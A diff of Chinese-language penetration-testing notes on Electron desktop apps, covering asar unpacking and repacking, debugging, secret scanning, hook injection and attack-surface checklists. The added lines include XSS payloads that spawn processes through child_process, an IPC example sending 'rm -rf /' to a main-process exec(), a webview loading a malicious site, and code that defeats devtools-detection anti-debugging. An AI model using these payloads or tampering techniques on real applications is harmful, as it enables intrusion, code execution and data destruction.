@@ -22,59 +22,6 @@
 + app.asar是项目源码的归档文件。
 + exe文件是程序的启动文件。
 
-asar文件
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ 程序解包
-    ::
-    
-        npm install asar -g
-        asar extract app.asar app //解压拿到源码
-+ 程序打包
-    ::
-    
-        asar pack app app.asar //重新打包
-+ 注意
-    - app.asar一般都没有做进一步的加密处理，所以拿到源码不难
-    - 不排除有的厂商可能在这方面做了一定的保护，就需要我们自己去逆向找到解密方法了，可以参考coco2d等。
-    - 拿到的js源码一般都会做一定的混淆，通过搜索js混淆技术和反混淆、格式化等，基本可以恢复到能够方便阅览的源码。
-    - 如果想验证某些功能，或者做些修改，可以通过重打包然后替换app.asar。
-
-查看版本
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ Devtool查看
-    ::
-    
-        前提是App启用了node Integration属性。
-        Devtool控制台输入：process.versions.electron
-+ UA查看
-    ::
-    
-        使用Devtool查看网络通信数据，查看User Agent头。
-+ 重新封包法
-    ::
-    
-        var fs = require("fs");
-        var querystring= require('querystring');
-
-        console.log("准备写入文件");
-        fs.writeFile('input.txt', querystring.stringify(process.versions),  function(err) {
-           if (err) {
-               return console.error(err);
-           }
-           console.log("数据写入成功！");
-           console.log("--------我是分割线-------------")
-           console.log("读取写入的数据！");
-           fs.readFile('input.txt', function (err, data) {
-              if (err) {
-                 return console.error(err);
-              }
-              console.log("异步读取文件数据: " + data.toString());
-           });
-        });
-        保存以上js内容为getVersionInfo.js，保存于解包后的文件夹中
-        修改package.json的main字段为getVersionInfo.js
-        重新封包，替换原来的.asar文件。
-
 程序结构
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + 主进程
@@ -109,42 +56,63 @@ asar文件
 |electron1|
 |electron2|
 
-程序调试
+asar文件
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ 添加代码法
++ 程序解包
     ::
     
-        asar extract app.asar app //解压拿到源码
-        mainWindow.webContents.openDevTools();//找到main.js，加入这行代码
-        asar pack app app.asar //重新打包，替换原始app.asar
-        注：这里调试的是渲染进程。
-
-+ 端口调试法
+        windows系统安装node.js
+        在其目录中执行：npm install asar -g
+        asar e app.asar app //解压拿到源码
++ 程序打包
     ::
     
-        安装chrome浏览器，打开chrome://inspect
-        配置Discover network targets，添加9222，9229端口
-        
-        调试渲染进程：
-        命令行启动目标程序 *.exe -remote-debugging-port=9222
-        浏览器中即可出现对应的页面，点击inspect调试
-        
-        调试主进程：
-        使用Electron提供的 ​--inspect​ 和 ​--inspect-brk​ 开关。
-        --inspect-brk=[port] 和--inspector 一样，但是会在JavaScript 脚本的第一行暂停运行。
-        使用以下命令：
-        electron --inspect[=5858] your/app
-        注：默认是9229端口。
-
-+ Debugtron工具
+        asar p app app.asar //重新打包
++ js格式美化
     ::
     
-        地址：https://github.com/pd4d10/debugtron
-        注：可调试主进程和渲染进程。
+        npm install uglify-js -g
+        uglifyjs main.js -b -o _main.js
++ 注意
+    - app.asar一般都没有做进一步的加密处理，所以拿到源码不难
+    - 不排除有的厂商可能在这方面做了一定的保护，就需要我们自己去逆向找到解密方法了，可以参考coco2d等。
+    - 拿到的js源码一般都会做一定的混淆，通过搜索js混淆技术和反混淆、格式化等，基本可以恢复到能够方便阅览的源码。
+    - 如果想验证某些功能，或者做些修改，可以通过重打包然后替换app.asar。
 
-
-核心选项
+信息收集
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 查看版本
+    ::
+    
+        Devtool查看法：
+        前提是App启用了node Integration属性。
+        Devtool控制台输入：process.versions.electron
+        
+        UA查看法：
+        使用Devtool查看网络通信数据，查看User Agent头。
+        
+        修改代码法：
+        var fs = require("fs");
+        var querystring= require('querystring');
+
+        console.log("准备写入文件");
+        fs.writeFile('input.txt', querystring.stringify(process.versions),  function(err) {
+           if (err) {
+               return console.error(err);
+           }
+           console.log("数据写入成功！");
+           console.log("--------我是分割线-------------")
+           console.log("读取写入的数据！");
+           fs.readFile('input.txt', function (err, data) {
+              if (err) {
+                 return console.error(err);
+              }
+              console.log("异步读取文件数据: " + data.toString());
+           });
+        });
+        保存以上js内容为getVersionInfo.js，保存于解包后的文件夹中
+        修改package.json的main字段为getVersionInfo.js
+        重新封包，替换原来的.asar文件。
 + Sandbox（沙箱）
     - 即Chromium的沙盒特性，如果开启了这个选项， 渲染进程将运行在沙箱中，限制了大多数系统资源的访问，包括文件读写，新进程启动等， preload.js和网页中的js都会受到这个选项的影响
     - 该选项会随着Node Integration的开启而关闭
@@ -181,6 +149,118 @@ asar文件
         ::
         
             查找contextIsolation: 选项设置
++ js敏感信息扫描
+    - jsluice：``go install github.com/BishopFox/jsluice/cmd/jsluice@latest``
+    - 查找urls
+        ::
+        
+            linux:
+            find . -type f -name "*.js" | jsluice urls | jq -r '.url' | sort -u
+            windows:
+            for /r C:/Users/Administrator/Desktop/app %i in (*.js) do @echo %i|jsluice urls
+    - 查找敏感信息
+        ::
+        
+            for /r C:/Users/Administrator/Desktop/app %i in (*.js) do @echo %i|jsluice secrets
+
+程序调试
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 添加代码法
+    ::
+    
+        asar extract app.asar app //解压拿到源码
+        根据package.json文件main节点，查看入口代码文件：
+        插入mainWindow.webContents.openDevTools();
+        mainWindow.webContents.openDevTools({mode:'right'})；
+        mainWindow.webContents.openDevTools({mode:'bottom'})；
+        mainWindow.webContents.openDevTools({mode:'left'})；
+        mainWindow.webContents.openDevTools({mode:'detach'})
+        mainWindow.webContents.openDevTools({mode:'undocked'})
+        注：如果代码进行了混淆，无法找到BowserWindow创建位置，就在文件头部或者末尾添加：
+        let {BrowserWindow} = require('electron');
+        let timer = null;
+        timer = setInterval(()=>{
+            let windows = BrowserWindow.getAllWindows();
+            if(windows.length > 0){
+                windows.forEach(v=>{
+                    if(v){
+                        v.webContents.openDevTools();
+                    }
+                })
+                clearInterval(timer);
+            }
+        },5000);
+        //重新打包，替换原始app.asar
+        asar pack app app.asar 
+        注：这里调试的是渲染进程。
+        假如打开程序5s后，程序关闭，那么可能是对devtool窗口有监控，则可以关闭devtool打开的事件监听：
+                let {BrowserWindow} = require('electron');
+        let timer = null;
+        timer = setInterval(()=>{
+            let windows = BrowserWindow.getAllWindows();
+            if(windows.length > 0){
+                windows.forEach(v=>{
+                    if(v){
+                        v.webContents.removeAllListeners('devtools-opened');
+                        v.webContents.openDevTools();
+                    }
+                })
+                clearInterval(timer);
+            }
+        },5000);
+        或者添加以下代码将窗口的close置空：
+        v.close = () =>{};
++ 端口调试法
+    ::
+    
+        调试渲染进程：
+        命令行启动目标程序 *.exe -remote-debugging-port=9222
+        浏览器中即可出现对应的页面，点击inspect调试
+        
+        调试主进程：
+        下载对应版本的node和electron，然后将node添加到环境变量中。
+        配置electron下载源，安装npm install electron@17.1.2
+        npm config set ELECTRON_MIRROR https://npm.taobao.org/mirrors/electron/
+        使用Electron提供的 ​--inspect​ 和 ​--inspect-brk​ 开关以调试模式打开程序。
+        --inspect-brk=[port] 和--inspector 一样，但是会在JavaScript 脚本的第一行暂停运行。
+        使用以下命令：
+        electron --inspect[=5858] your/app
+        注：默认是9229端口。
+        
+        安装chrome浏览器，打开chrome://inspect
+        配置Discover network targets，添加9222，9229端口
+        加载源码，在js入口处添加断点。
++ 初始调试法
+    ::
+    
+        找到index.html，在body部分添加：
+        <script>alert("hello")</script>
+        重新封包，打开程序，在出现弹框时，按下enter的同时，按ctrl + shift + i就可以打开控制台。
++ Debugtron工具
+    ::
+    
+        地址：https://github.com/pd4d10/debugtron
+        注：可调试主进程和渲染进程。
++ 设置代理
+    ::
+    
+        /app.exe --args --proxy-server=127.0.0.1:8080 --ignore-certificate-errors
+
+注入hook
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ did-finish-load事件
+    ::
+    
+        首先在窗口创建部分添加事件：
+        mainWindow.webContents.on("did-finish-load", function() {
+        const js = fs.readFileSync(path.join(__dirname, 'netflixHook.js')).toString();
+        mainWindow.webContents.executeJavaScript(js);
+        });
+        netflixHook.js文件如下：
+        const injection = () => {
+            //这里填写js hook代码
+        };
+        inject();
 
 攻击面分析
 ----------------------------------------
@@ -193,10 +273,24 @@ asar文件
 通过IPC影响主进程进行RCE
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + 需要主进程ipcmain，实现了危险方法
+    ::
+    
+        例如主进程：
+        ipcMain.on('fetch-data', (event, data) => {
+            exec(data);  // Potentially dangerous function call
+        });
+        渲染进程：
+        ipcRenderer.send('fetch-data', 'rm -rf /');
 + 需要当前执行上下文可以访问IPC
 
 常规利用方法
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 分析选项开启状态
+    ::
+    
+        grep -r "sandbox:" ./
+        grep -r "nodeIntegration:" ./
+        grep -r "contextIsolation:" ./
 + NI为true, CISO为 false，SBX为false
     - 允许了页面之间访问nodejs共享库，只要获取目标应用的一个XSS漏洞，就能直接通过访问NodeJS共享库，升级为XSS漏洞。
     - NI配置方法：在man.js中webPreferences中配置了nodeIntegration为true/false
@@ -241,6 +335,8 @@ asar文件
 
 更新升级
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ MITM
+    - HTTP方式升级
 + windows升级提权
     ::
     
@@ -259,13 +355,28 @@ asar文件
 
 挖掘思路
 ----------------------------------------
-+ 分析选项开启状态
++ 组件漏洞
     ::
     
-        grep -r "sandbox:" ./
-        grep -r "nodeIntegration:" ./
-        grep -r "contextIsolation:" ./
-+ 分析组件版本
+        使用asar解压程序文件，切换到解压目录中.
+        执行 npm install --package-lock-only 生成package-lock.json文件。
+        执行 npm audit --verbose进行组件漏洞分析。
++ XSS漏洞
+    ::
+    
+        示例程序：https://github.com/MrH4r1/Electro-XSS
+        payload：
+        <img src=x onerror=alert(1) />
+        <img src=x onerror=alert(require('child_process').execSync('gnome-calculator')); />
+        <img src=x onerror=alert(require('child_process').exec('calc')); />
++ IPC攻击
++ webview攻击
+    ::
+    
+        webPreferences中启用webview：
+        webviewTag: true
+        <webview src="http://malicious.site"></webview>
++ 升级漏洞
 + 查看是否有自定义协议
     ::
     
